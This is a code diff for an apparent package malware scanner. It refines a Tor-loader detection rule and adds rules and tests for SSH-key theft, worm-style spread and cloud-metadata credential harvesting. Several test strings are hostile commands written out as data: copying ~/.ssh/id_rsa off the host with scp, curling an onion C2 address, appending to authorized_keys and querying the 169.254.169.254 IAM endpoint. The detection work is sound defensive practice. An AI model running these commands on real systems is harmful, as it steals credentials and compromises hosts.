@@ -1779,16 +1779,10 @@ pub fn get_builtin_rules() -> Vec<Rule> {
         Rule {
             id: "ATOMIC-006".to_string(),
             name: "Private Tor client / onion C2 (stage-1 loader)".to_string(),
-            description: "References the private-Tor bootstrap and .onion C2 artifacts of the July 2026 Wave-3 loader: downloading the Tor expert bundle from archive.torproject.org, launching tor with `--DataDirectory`/`--SocksPort` under /tmp, the `LD_LIBRARY_PATH=/tmp/tb` launch template, the known Wave-3 C2 onion, or the `Bootstrapped 100%` wait marker. Stage 1 uses this to fetch and run stage 2 over Tor, bypassing the previous npm/bun delivery.".to_string(),
+            description: "References the private-Tor bootstrap and .onion C2 artifacts of the July 2026 Wave-3 loader: launching tor with `--DataDirectory`/`--SocksPort` under /tmp, the `LD_LIBRARY_PATH=/tmp/tb` launch template, or the known Wave-3 C2 onion. Stage 1 uses this to fetch and run stage 2 over Tor, bypassing the previous npm/bun delivery. Only loader-specific artifacts are flagged (the generic `archive.torproject.org` download, `tor-expert-bundle`, and `Bootstrapped 100%` log line are legitimate Tor usage and deliberately NOT matched here).".to_string(),
             severity: Severity::Critical,
             category: Category::Persistence,
             patterns: vec![
-                Pattern::Regex {
-                    pattern: r"archive\.torproject\.org/tor-package-archive".to_string(),
-                },
-                Pattern::Regex {
-                    pattern: r"tor-expert-bundle".to_string(),
-                },
                 Pattern::Regex {
                     pattern: r"--DataDirectory\s+/tmp/tb".to_string(),
                 },
@@ -1797,9 +1791,6 @@ pub fn get_builtin_rules() -> Vec<Rule> {
                 },
                 Pattern::Regex {
                     pattern: r"LD_LIBRARY_PATH=/tmp/tb".to_string(),
-                },
-                Pattern::Regex {
-                    pattern: r"Bootstrapped\s+100%".to_string(),
                 },
                 Pattern::Regex {
                     pattern: r"p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd\.onion"
@@ -1852,12 +1843,76 @@ pub fn get_builtin_rules() -> Vec<Rule> {
                     pattern: r"AllowSingleHopCircuits".to_string(),
                 },
                 Pattern::Regex {
-                    pattern: r"security\.selinux".to_string(),
+                    pattern: r"security\.selinux\s+-v\s+0x01".to_string(),
                 },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Stage-2 Tor-exfil masquerade indicators. The agent exfiltrates harvested credentials over its own Tor channel. Treat the host as compromised: rotate browser sessions, wallet seeds, cloud and dev credentials, and SSH keys.".to_string(),
-            cwe_id: Some("CWE-200".to_string()),
+            cwe_id: Some("CWE-522".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+
+        // ============================================================
+        // "Atomic Arch" Wave 3 — lateral movement & cloud-metadata exfil
+        // The stage-2 agent is an SSH worm (reads id_rsa/id_ecdsa/id_ed25519
+        // + known_hosts, spreads via ssh/scp) and harvests cloud IAM creds
+        // from the link-local metadata endpoint (169.254.169.254 IMDS,
+        // metadata.google.internal). These complete the attack chain that
+        // ATOMIC-005..008 cover at the build/persistence layer.
+        // ============================================================
+        Rule {
+            id: "ATOMIC-009".to_string(),
+            name: "SSH key exfil / lateral movement (SSH worm)".to_string(),
+            description: "References the SSH-worm lateral-movement behavior of the Wave-3 stage-2 agent: reading/stealing private SSH keys (id_rsa, id_ecdsa, id_ed25519) together with known_hosts, or pushing a payload to a remote host via ssh/scp with BatchMode/StrictHostKeyChecking=no. This is how the agent spreads across a network after the initial compromise.".to_string(),
+            severity: Severity::Critical,
+            category: Category::CredentialTheft,
+            patterns: vec![
+                Pattern::Regex {
+                    pattern: r"~?/\.ssh/(id_rsa|id_ecdsa|id_ed25519)\b".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"authorized_keys".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"known_hosts".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"ssh\s+.*(BatchMode|StrictHostKeyChecking)".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"scp\s+.*(id_rsa|id_ecdsa|id_ed25519)".to_string(),
+                },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "This indicates SSH-worm lateral movement. Do NOT build. The agent steals SSH keys and spreads across the network. Treat the host and any reachable host as compromised: revoke all SSH keys, rotate credentials, and inspect ~/.ssh/authorized_keys for injected keys.".to_string(),
+            cwe_id: Some("CWE-522".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "ATOMIC-010".to_string(),
+            name: "Cloud metadata endpoint exfiltration".to_string(),
+            description: "References the cloud IAM metadata endpoint (169.254.169.254 IMDS, 169.254.170.2 ECS, metadata.google.internal) used to harvest temporary cloud credentials. The Wave-3 stage-2 agent queries these to obtain IAM creds on EC2/GCP/Azure/Alibaba/Oracle instances. Querying the link-local metadata service is a standard credential-stealer vector and never legitimate in a PKGBUILD build/install phase.".to_string(),
+            severity: Severity::Critical,
+            category: Category::CredentialTheft,
+            patterns: vec![
+                Pattern::Regex {
+                    pattern: r"169\.254\.169\.254".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"169\.254\.170\.2".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"metadata\.google\.internal".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"latest/meta-data".to_string(),
+                },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "This harvests cloud IAM credentials. Do NOT build. A package must never query the cloud metadata endpoint. Rotate all cloud credentials for the affected instance/account and revoke any obtained tokens.".to_string(),
+            cwe_id: Some("CWE-522".to_string()),
             enabled: true,
             case_sensitive: false,
         },
@@ -3117,9 +3172,7 @@ mod tests {
     fn test_atomic006_tor_loader_fires() {
         let engine = RuleEngine::default();
         for s in [
-            "curl -sLk -o tb.tar.gz https://archive.torproject.org/tor-package-archive/torbrowser/16.0a7/tor-expert-bundle-linux-x86_64-16.0a7.tar.gz",
             "LD_LIBRARY_PATH=/tmp/tb /tmp/tb/tor --DataDirectory /tmp/tb/data --SocksPort 7050",
-            "grep -q 'Bootstrapped 100%' /tmp/tb/tor.log",
             "curl -sS http://p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion/",
         ] {
             let m = engine.match_content(s, FileType::Pkgbuild);
@@ -3159,6 +3212,73 @@ mod tests {
             assert!(
                 m.iter().any(|x| x.rule_id == "ATOMIC-008"),
                 "ATOMIC-008 missed masquerade: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic006_no_fp_on_legit_tor_usage() {
+        // Legit Tor bundle download / bootstrapping must NOT fire ATOMIC-006.
+        let engine = RuleEngine::default();
+        for s in [
+            "curl -sL -o tb.tar.gz https://archive.torproject.org/tor-package-archive/torbrowser/tor-expert-bundle-linux-x86_64.tar.gz",
+            "grep -q 'Bootstrapped 100%' /tmp/tb/tor.log",
+            "tor --DataDirectory /home/me/tor --SocksPort 9050",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "ATOMIC-006"),
+                "ATOMIC-006 false positive on legit Tor usage: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic008_no_fp_on_selinux_without_0x01() {
+        // A plain security.selinux xattr (no 0x01 value) must NOT fire ATOMIC-008.
+        let engine = RuleEngine::default();
+        for s in [
+            "setfattr -n security.selinux -v 0x02 /etc/resolv.conf",
+            "chcon system_u:object_r:etc_t:s0 /etc/hosts",
+            "getfattr -n security.selinux /run/utmp",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "ATOMIC-008"),
+                "ATOMIC-008 false positive on SELinux xattr without 0x01: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic009_ssh_worm_fires() {
+        let engine = RuleEngine::default();
+        for s in [
+            "cat ~/.ssh/id_rsa > /tmp/keys && scp /tmp/keys root@host:/tmp/",
+            "ssh -o BatchMode=yes -o StrictHostKeyChecking=no root@192.168.1.5 'echo deployed'",
+            "cat ~/.ssh/known_hosts",
+            "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-009"),
+                "ATOMIC-009 missed SSH worm: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic010_cloud_metadata_fires() {
+        let engine = RuleEngine::default();
+        for s in [
+            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
+            "curl http://169.254.170.2/credentials",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-010"),
+                "ATOMIC-010 missed cloud metadata exfil: {s} -> {m:?}"
             );
         }
     }
